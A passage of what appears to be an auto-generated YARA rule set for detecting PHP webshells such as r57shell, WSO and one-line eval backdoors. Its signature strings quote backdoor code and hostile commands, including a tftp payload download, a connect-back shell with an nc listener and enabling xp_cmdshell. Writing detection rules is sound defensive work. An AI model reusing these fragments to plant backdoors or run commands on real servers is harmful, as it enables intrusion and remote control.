      hash1 = "d0f6baf256342ba8c30c576c517c5b6e54a2be73b3e3ce218e70998f8f51bc1d"
   strings:
      $x1 = "\\\">lostpassword</a> and <a href = \\\"http://www.d3vilc0de.org\\\">D3vilc0de crew</a> ]</center>\\n</body>\\n</html>\";" fullword ascii
      $x2 = "* PHP Shell scritta da lostpassword, D3vilc0de crew" fullword ascii
      $x3 = "* La Shell presenta varie funzioni, ma rimane comunque in continuo aggiornamento" fullword ascii
      $s4 = "print \"<td>[ <a class = \\\"head\\\" href = '\" . $c . \"&mode=execute'>Shell Command</a> ]</td>\\n\";" fullword ascii
      $s5 = "print \"Executing the following command:<br />\\n\";" fullword ascii
      $s6 = "print \"<tr>\\n<td><input type = 'submit' value = 'Execute'></td>\\n</tr>\\n</form>\\n</table>\";" fullword ascii
      $s7 = "header ( \"Content-Description: Download manager\" );" fullword ascii
      $s8 = "print \"<table>\\n<form action = '\" . $c . \"&mode=execute' method = 'POST'>\\n\";" fullword ascii
      $s9 = "$ret = shellexec($command);" fullword ascii
      $s10 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir.'&mode=remove&file='.__FILE__);" fullword ascii
      $s11 = "$info .= ((ini_get('magic_quotes_gpc') == 0) ? '[~]Magic Quotes: <font color=\"#00FF33\">OFF</font><br />' : '[~]Magic Quotes:" fullword ascii
      $s12 = "<a href = '\" . $c .\"&mode=rename&old=\" . $out . \"'><img src = 'http://img51.imageshack.us/img51/7241/replyl.gif'" fullword ascii
      $s13 = "function shellexec($cmd) {" fullword ascii
      $s14 = "header ( \"Content-Disposition: attachment; filename=\".$filename.\";\" );" fullword ascii
      $s15 = "print $_POST ['hash'] . \": \" . \"<b>\" . hash ($_POST ['type'], $_POST ['hash']) . \"</b>\";" fullword ascii
      $s16 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);" fullword ascii
      $s17 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].$c.'/'.$goto);" fullword ascii
      $s18 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" seconds | by <a href=\\\"http://lostpassword.hellospace.ne" ascii
      $s19 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" seconds | by <a href=\\\"http://lostpassword.hellospace.ne" ascii
      $s20 = "* Data rilascio: 25/12/2009 (eh si, il giorno di natale non avevo niente da fare)" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_528f2ab667dc8492e589a00c579edaaf16f03859
{
   meta:
      description = "php17 - file 528f2ab667dc8492e589a00c579edaaf16f03859.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5aad1a2e4c160a826e6d62b34f0d1ecc9bd9ffc688774fb055f7e0cf50d08e66"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = ": '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>" fullword ascii
      $x3 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x4 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x5 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $x6 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $x7 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $x8 = "echo \"<font color=blue>Send: site exec</font> <font color=green>\".$_POST[\"SUCommand\"].\"</font><br>\";" fullword ascii
      $s9 = "if(@ereg(\"default\\.|index\\.|admin\\.|bbs\\.|conn\\.|config\\.|reg\\.|help\\.|upfile\\.|upload\\.|cart\\.|class\\.|login\\.|di" ascii
      $s10 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'" fullword ascii
      $s11 = "</a> | <a href=\"?dir=C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\">pcAnywhere</a> ');" fullword ascii
      $s12 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s13 = "if($_POST['SUPort'] != \"\" && $_POST['SUUser'] != \"\" && $_POST['SUPass'] != \"\" && $_POST['SUCommand'])" fullword ascii
      $s14 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");" fullword ascii
      $s15 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s16 = "$tb->tdbody('URL: '.$tb->makeinput('url','http://www.google.com','','text','100').' '.$tb->makeinput('','" fullword ascii
      $s17 = ":'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','" fullword ascii
      $s18 = ":$dir/$file</span> |<a href=\\\"?action=editfile&dir=$dir&editfile=$file\\\" target=\\\"_blank\\\">view+edit</a> | $end <br>\";" fullword ascii
      $s19 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
      $s20 = "\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_404_php_no
{
   meta:
      description = "php17 - file 404.php.no.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fb11c438682498254ede5200573674ff180ae888b92aee9996db7800fa55b4c4"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\"; " fullword ascii
      $x2 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $x3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',null" fullword ascii
      $x4 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true; " fullword ascii
      $x6 = "/* WSO 2.6 (404 Error Web Shell by Madleets.com) */" fullword ascii
      $x7 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login ->" fullword ascii
      $x8 = "<input type='button' value='hashcrack.com' onclick=\\\"document.hf.action='http://www.hashcrack.com/index.php';documen" fullword ascii
      $x9 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $x10 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) " fullword ascii
      $x11 = "print \"<font color='green'>[+] Exploitable!</font> <a href=\\\"\".$target.\"\".$lfitest.\"\\\">\".$target.\"\".$lfitest.\"</" fullword ascii
      $s12 = "<input type='button' value='md5decrypter.com' onclick=\\\"document.hf.action='http://www.md5decrypter.com/';document.h" fullword ascii
      $s13 = "wsoSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s14 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfierror[$x].\"\\\">\".$target.\"\".$lfie" fullword ascii
      $s15 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lficonfig[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s16 = "$m = array('Sec Info'=>'SecInfo','Files'=>'FilesMan','Exec'=>'Console','Sql'=>'Sql','PHP Tools'=>'phptools','LFI'=>'lfiscan'" fullword ascii
      $s17 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { " fullword ascii
      $s18 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); " fullword ascii
      $s19 = "<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr> " fullword ascii
      $s20 = "39 => \"../../../../../../../../../../../../../../../var/log/ftp-proxy/ftp-proxy.log\".$byte1.\"\", " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule AddAnnotatedClassesToCachePassTest
{
   meta:
      description = "php17 - file AddAnnotatedClassesToCachePassTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bce011f4dd4d24e728b2350f6ebd42084d7711ba91b824415fd80a190643e04b"
   strings:
      $x1 = "use Symfony\\Component\\HttpKernel\\DependencyInjection\\AddAnnotatedClassesToCachePass;" fullword ascii
      $x2 = "namespace Symfony\\Component\\HttpKernel\\Tests\\DependencyInjection;" fullword ascii
      $s3 = "$this->assertEmpty($expand(array('Foo\\\\*\\\\Bar'), array('\\\\Foo\\\\Acme\\\\Bundle\\\\Bar')));" fullword ascii
      $s4 = "$this->assertEmpty($expand(array('**\\\\Foo'), array('\\\\Acme\\\\Foo\\\\AcmeBundle')));" fullword ascii
      $s5 = "$this->assertEmpty($expand(array('**\\\\Foo'), array('\\\\Acme\\\\FooBar\\\\AcmeBundle')));" fullword ascii
      $s6 = "$this->assertEmpty($expand(array('Foo\\\\*'), array('\\\\Foo\\\\Acme\\\\Bar')));" fullword ascii
      $s7 = "$this->assertEmpty($expand(array('*\\\\Bar'), array('\\\\Foo\\\\Acme\\\\Bar')));" fullword ascii
      $s8 = "$this->assertEmpty($expand(array('**\\\\Foo\\\\'), array('\\\\Foo\\\\Bar')));" fullword ascii
      $s9 = "$this->assertEmpty($expand(array('**\\\\Foo\\\\'), array('\\\\Acme\\\\Foo')));" fullword ascii
      $s10 = "$this->assertEmpty($expand(array('**\\\\Bar'), array('\\\\Bar')));" fullword ascii
      $s11 = "$this->assertEmpty($expand(array('*\\\\Bar'), array('\\\\Bar')));" fullword ascii
      $s12 = "$this->assertEmpty($expand(array('Foo\\\\'), array('\\\\Foo')));" fullword ascii
      $s13 = "$this->assertEmpty($expand(array('**\\\\Foo\\\\'), array('\\\\Foo')));" fullword ascii
      $s14 = "$this->assertSame('Foo\\\\Acme\\\\Bundle\\\\Bar', $expand(array('**\\\\Bar'), array('\\\\Foo\\\\Acme\\\\Bundle\\\\Bar'))[0]);" fullword ascii
      $s15 = "$expand(array('**Bundle\\\\Controller\\\\'), array('\\\\Acme\\\\FooBundle\\\\Controller\\\\Bar\\\\DefaultController'))[0]" fullword ascii
      $s16 = "$this->assertSame('Foo\\\\Acme\\\\Bar', $expand(array('Foo\\\\**\\\\Bar'), array('\\\\Foo\\\\Acme\\\\Bar'))[0]);" fullword ascii
      $s17 = "$expand(array('**Bundle\\\\Controller\\\\'), array('\\\\Acme\\\\FooBundle\\\\Controller\\\\DefaultController'))[0]" fullword ascii
      $s18 = "$expand(array('**Bundle\\\\Controller\\\\'), array('\\\\Acme\\\\Bundle\\\\Controller\\\\Bar\\\\DefaultController'))[0]" fullword ascii
      $s19 = "$this->assertSame(array('Foo\\\\Bar'), $expand(array('Foo\\\\*'), array('Foo\\\\Bar', 'Foo\\\\BarTest')));" fullword ascii
      $s20 = "$this->assertSame('Foo\\\\Acme\\\\Bar', $expand(array('**\\\\Bar'), array('\\\\Foo\\\\Acme\\\\Bar'))[0]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}


rule sig_6354d1fb0ed12066ce1ec5ab1bb4ec151941ecb1
{
   meta:
      description = "php17 - file 6354d1fb0ed12066ce1ec5ab1bb4ec151941ecb1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6270bb35d95c87b5135868da21c0ad84d6155cd5f7ccb9dbe517cd50b5b8f9fc"
   strings:
      $x1 = "# otherwise, execute a shell command" fullword ascii
      $s2 = "# if `cmd` is a trojan payload, execute it" fullword ascii
      $s3 = "# execute the command" fullword ascii
      $s4 = "# File-download payload" fullword ascii
      $s5 = "function payload_download ($cwd, $args) {" fullword ascii
      $s6 = "if (!isset($post['auth']) || $post['auth'] !== PASSWORD) {" fullword ascii
      $s7 = "$post = json_decode(file_get_contents('php://input'), true);" fullword ascii
      $s8 = "# open the file as binary, and base64-encode its contents" fullword ascii
      $s9 = "$stderr = [ 'Could not download file.', $e->getMessage() ];" fullword ascii
      $s10 = "# TODO: Change this password. Don't leave the default!" fullword ascii
      $s11 = "# File-upload payload" fullword ascii
      $s12 = "$stdout = base64_encode(file_get_contents($args['file']));" fullword ascii
      $s13 = "# Override the default error handling to:" fullword ascii
      $s14 = "function payload_upload ($cwd, $args) {" fullword ascii
      $s15 = "$cmd = \"cd $cwd; {$post['cmd']} 2>&1; pwd\";" fullword ascii
      $s16 = "exec($cmd, $output);" fullword ascii
      $s17 = "# To test this trojan locally, run the following in the directory containing " fullword ascii
      $s18 = "function payload_autodestruct ($cwd, $args) {" fullword ascii
      $s19 = "if (function_exists($post['cmd'])) {" fullword ascii
      $s20 = "file_put_contents( $args['dst'], base64_decode($args['data']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule AbstractBearerTest
{
   meta:
      description = "php17 - file AbstractBearerTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "894cacfd48a07d39e0d0f57fd578e15cde49b4ddad75988734f90b6ebef19942"
   strings:
      $s1 = "* This method should return true or false depending on if login" fullword ascii
      $s2 = "* @param string $bearerToken" fullword ascii
      $s3 = "* Validates a bearer token" fullword ascii
      $s4 = "$request = new HTTP\\Request('GET', '/');" fullword ascii
      $s5 = "$request = new HTTP\\Request('GET', '/', [" fullword ascii
      $s6 = "return 'valid' === $bearerToken ? 'principals/username' : false;" fullword ascii
      $s7 = "$response->getHeader('WWW-Authenticate')" fullword ascii
      $s8 = "function validateBearerToken($bearerToken) {" fullword ascii
      $s9 = "function testCheckNoHeaders() {" fullword ascii
      $s10 = "'Authorization' => 'Bearer foo'," fullword ascii
      $s11 = "function testCheckInvalidToken() {" fullword ascii
      $s12 = "$response = new HTTP\\Response();" fullword ascii
      $s13 = "namespace Sabre\\DAV\\Auth\\Backend;" fullword ascii
      $s14 = "'Authorization' => 'Bearer valid'," fullword ascii
      $s15 = "$backend->setRealm('writing unittests on a saturday night');" fullword ascii
      $s16 = "'Bearer realm=\"writing unittests on a saturday night\"'," fullword ascii
      $s17 = "function testRequireAuth() {" fullword ascii
      $s18 = "class AbstractBearerTest extends \\PHPUnit_Framework_TestCase {" fullword ascii
      $s19 = "[true, 'principals/username']," fullword ascii
      $s20 = "$backend->challenge($request, $response);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_743fb577b5f89efcf619170208ba18da78b5cf38
{
   meta:
      description = "php17 - file 743fb577b5f89efcf619170208ba18da78b5cf38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b90999530366fd5b8763703e24ee972d809e1ff4724233ac3848dfaf3ec14ae0"
   strings:
      $s1 = "$sF=\"PCT4BA6ODSE_\";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$s" fullword ascii
      $s2 = "'N'=>'R', 'Q'=>'X', 'P'=>'P', 'S'=>'n', 'R'=>'7', 'U'=>'m', 'T'=>'Z', 'W'=>'1', 'V'=>'s', 'Y'=>'C', 'X'=>'t', 'Z'=>'E', 'a'=>'I" fullword ascii
      $s3 = "'y', 'n'=>'G', 'q'=>'H', 'p'=>'l', 's'=>'Y', 'r'=>'k', 'u'=>'v', 't'=>'p', 'w'=>'U', 'v'=>'z', 'y'=>'0', 'x'=>'A', 'z'=>'B');" fullword ascii
      $s4 = "F[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['nf77be8'];if(isset($s22)){eval($s21($s22));}?><?php" fullword ascii
      $s5 = "'oI7kVIQtpinHB4cwchkbrT7huTnw9Hkb2jWhw7oHyIneXTQM0QArt369HHnWp4DhBTcevafyC2qeG4ceoI7kVIQtpinHB4cwchkb'." fullword ascii
      $s6 = "'pscbrTACrQWzPwWNlaUhuTnw0QArt369HTQBtLYCt36tbYCttT0x9IQhvTQ29Hkb2jWhw7oHy5QzpapytaYsUaYNmwZbjekV0L'." fullword ascii
      $s7 = "'ECHnhulSNplS2RYSyiYUTWlUhyI7bGaneo4UboQv26hYCtYSViY7Bps7Np40C0AkNwwYKdJFZChfxyaZOuLYznlDeGTYa'." fullword ascii
      $s8 = "'tQjViYCrH4ceGTkbXs7pViYNU4UbXJYxrT7WBI76VaYNyIneXTA6CHnWp4DhBTcwVaYNXs7pVTQat369Hm2tbYCtUL7OFLnpul0z'." fullword ascii
      $s9 = "'pL7vxX3eWKMeV6JjpL7vxX3eWKMpV6JjNL7vxX3eWKMFelMYyWQAr9QYE97vxX3eWK7vZX3eWlMYyOQQ6d7vxX3eWlMYy'." fullword ascii
      $s10 = "'rpMNeMCsQMCHnXp5AxbP0xrTUpVTAriY2pRYCrHYANUI7dplUkXTAxbankVLneoQcWBsDHu4oCrs7dtsQhp4WVrIceOQArRYCrHY'." fullword ascii
      $s11 = "'xClnp8TAzhs7MCjWMC7fVCT7EXLQMtaZk64ndpece0AcpyJvwo3YEd3Yx9AyBwjw6VandtIcwCNceFIcKtakTp4ShtlcE'." fullword ascii
      $s12 = "'2SQArCiAxr4nkos7Wv7oLe4ceoJwkST7OyHWyCPAx0j7bgI7dVsAKWJFxCinp2InbGTjVCejVC2Wzeanp2InbGTAzPwoxvQv'." fullword ascii
      $s13 = "'aYztT0CCaAztlpbB4SHB5ACr4nkos7Wv7oLXTQN9lc2SQA6CsQHosQr9HyLkeY4VaYL2jWhwHortaYrC4UeyLQHGaZTzjk'." fullword ascii
      $s14 = "'SHuleb9lDhyiYNU4UbXijViY2pbYCrHT7dvT29HYQViY2rHHnTolcyCPAzvLqHm4Ue6lnkFTAC07yhewWNPjey'." fullword ascii
      $s15 = "'NmwZbjeYzB4oxrIceOafy+aYN6lDhyi29HYQViY2rHHkb2jWhw7oN8TQpLafyC4DNoIQzF4cdB4cBp4oCr4nbvLY'." fullword ascii
      $s16 = "'pDhSHGTyXghyXk2AaVaYNW4UrVaYNFlcOyT7OyaYrRYC9HTQBtLYCCHnhulSNplS2CijVim29iYUTWlUhyI7bGanhW'." fullword ascii
      $s17 = "'jWaSQAxbaYadMF4GMYE6JFZ0369HYQyiYQyiYCptT0Bt4DhpLYCrQyTHjZejiAriYQViY2pUlDHps7h9iYNmN'." fullword ascii
      $s18 = "'HnWp4DhBTcwt369HYANXTQhvs7LpafyCLneELkbXs7holDM9HnWp4DhBTcwt369HYANXTQhvs7LpafyC5nOWlebXs'." fullword ascii
      $s19 = "'aYkt4DhpLYCrQWzPwWNlaUWp4DhBTcevapytYCrHYwbAaYkt4DhpLYCrQWzPwWNlaUTolcWvapytYCrHYwbAaY'." fullword ascii
      $s20 = "'BsDNtlcE0QArCH0sCIQhmTcbuTkbt4YCrQWhkwpTkwpVSwrehjWNkQykZNkaSQArtYSViY7ecs769sUkvTjsyQcN'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_20784cd31c22ddaa849b6c93042df34c1d462ab9
{
   meta:
      description = "php17 - file 20784cd31c22ddaa849b6c93042df34c1d462ab9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $x2 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s3 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s4 = "$head = '<!-- &#1047;&#1076;&#1088;&#1072;&#1074;&#1089;&#1090;&#1074;&#1091;&#1081;  &#1042;&#1072;&#1089;&#1103; -->" fullword ascii
      $s5 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s6 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s7 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s8 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
      $s9 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s10 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s11 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s12 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s13 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s14 = "exit(\"<b><a href=http://www.spygrup.org>www.spygrup.org</a> : Access Denied</b>\");" fullword ascii
      $s15 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s16 = "if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s17 = "if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s18 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s19 = "$db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
      $s20 = "$db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_2014_11_30_191858_create_pages_tables
{
   meta:
      description = "php17 - file 2014_11_30_191858_create_pages_tables.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "045a0b6174193a3008b3e807f3797e20a4636623230c15c4fe7308d39f44e58a"
   strings:
      $s1 = "$table->string('template');" fullword ascii
      $s2 = "Schema::create('page__page_translations', function (Blueprint $table) {" fullword ascii
      $s3 = "$table->string('meta_description')->nullable();" fullword ascii
      $s4 = "$table->string('og_description')->nullable();" fullword ascii
      $s5 = "Schema::drop('page__page_translations');" fullword ascii
      $s6 = "Schema::create('page__pages', function (Blueprint $table) {" fullword ascii
      $s7 = "$table->foreign('page_id')->references('id')->on('page__pages')->onDelete('cascade');" fullword ascii
      $s8 = "Schema::drop('page__pages');" fullword ascii
      $s9 = "$table->string('meta_title')->nullable();" fullword ascii
      $s10 = "$table->string('og_image')->nullable();" fullword ascii
      $s11 = "$table->integer('page_id')->unsigned();" fullword ascii
      $s12 = "$table->string('og_type')->nullable();" fullword ascii
      $s13 = "$table->string('og_title')->nullable();" fullword ascii
      $s14 = "$table->boolean('status')->default(1);" fullword ascii
      $s15 = "$table->boolean('is_home')->default(0);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule Annotations_case
{
   meta:
      description = "php17 - file Annotations.case.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9471f53c12f124f455217d500f32d49e6acc0f8181f6516f0e61e19a321362d4"
   strings:
      $s1 = "* https://github.com/php-annotations/php-annotations/issues/59" fullword ascii
      $s2 = "* @override('test'=>'This annotation should get filtered')" fullword ascii
      $s3 = "* @usage('property'=>true, 'multiple'=>false, 'inherited'=>true)" fullword ascii
      $s4 = "* @Override('test'=>'This annotation overrides the one in TestBase')" fullword ascii
      $s5 = "* @usage('class'=>true, 'property'=>true, 'method'=>true, 'inherited'=>true, 'multiple'=>true)" fullword ascii
      $s6 = "* @usage('property'=>true, 'multiple'=>false)" fullword ascii
      $s7 = "* @sample('test'=>'This should get filtered')" fullword ascii
      $s8 = "* @note(\"Applied to a hidden TestBase method\")" fullword ascii
      $s9 = "* @override('test'=>'This will be overridden')" fullword ascii
      $s10 = "* @Note(\"First Note Applied to the run() method\")" fullword ascii
      $s11 = "* @usage('method'=>true)" fullword ascii
      $s12 = "* @Note(\"And another one for good measure (b)\")" fullword ascii
      $s13 = "* @usage('class'=>true, 'inherited'=>false)" fullword ascii
      $s14 = "* @doc 1234 (this is a sample PHP-DOC style annotation)" fullword ascii
      $s15 = "* Test that using an user defined class will not break parsing." fullword ascii
      $s16 = "* @note(\"Applied to a TestBase member\")" fullword ascii
      $s17 = "* @single('test'=>'two is one too many')" fullword ascii
      $s18 = "* @usage" fullword ascii
      $s19 = "* @Note(\"Second note annotation\")" fullword ascii
      $s20 = "* @note(\"First note annotation\")" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_29c80a36f0919c39fb0de4732c506da5eee89783
{
   meta:
      description = "php17 - file 29c80a36f0919c39fb0de4732c506da5eee89783.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f1788abc45d6b3e93ced95c554bf3f1f82ef962fdc17be67d7c8e20504227065"
   strings:
      $s1 = "<?php $Exp=strrev($_POST['xise']);eval($Exp($_POST[z0]));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_79ab2c8beacee93a85bdfaeaccd623d4f84610a7
{
   meta:
      description = "php17 - file 79ab2c8beacee93a85bdfaeaccd623d4f84610a7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2967f38c26b131f00276bcc21227e54ee6a71881da1d27ec5157d83c4c9d4f51"
   strings:
      $s1 = "$arr = array($_POST['pass'],);" fullword ascii
      $s2 = "array_filter($arr, base64_decode($e));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2016_03_18_000001_create_humanresources_table
{
   meta:
      description = "php17 - file 2016_03_18_000001_create_humanresources_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "84ed461f0203489f76dde88bb146622f145ace99f4ff6322aaf745121daf563b"
   strings:
      $s1 = "$table->foreign('contact_id')->references('id')->on('contacts')->onDelete('set null');" fullword ascii
      $s2 = "Schema::create('humanresources', function (Blueprint $table) {" fullword ascii
      $s3 = "$table->foreign('business_id')->references('id')->on('businesses')->onDelete('cascade');" fullword ascii
      $s4 = "$table->integer('contact_id')->unsigned()->nullable();" fullword ascii
      $s5 = "$table->integer('business_id')->unsigned();" fullword ascii
      $s6 = "Schema::drop('humanresources');" fullword ascii
      $s7 = "$table->string('slug', 50)->index();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule sig_6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87
{
   meta:
      description = "php17 - file 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
   strings:
      $x1 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x3 = "echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x4 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x5 = "elseif(file_exists(\"c:\\\\winnt\\\\system32\\\\\")) $dir=\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\\\\mysqlDll.dll\"; " fullword ascii
      $x6 = "if(file_exists(\"c:\\\\windows\\\\system32\\\\\")) $dir=\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\mysqlDll.dll\";" fullword ascii
      $x7 = "Str[11] = \"tftp -i 123.234.222.1 get silic.exe c:\\\\silic.exe\";" fullword ascii
      $x8 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x9 = "Str[6] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');\";" fullword ascii
      $x10 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\boot.ini d:\\a.txt';" fullword ascii
      $x11 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
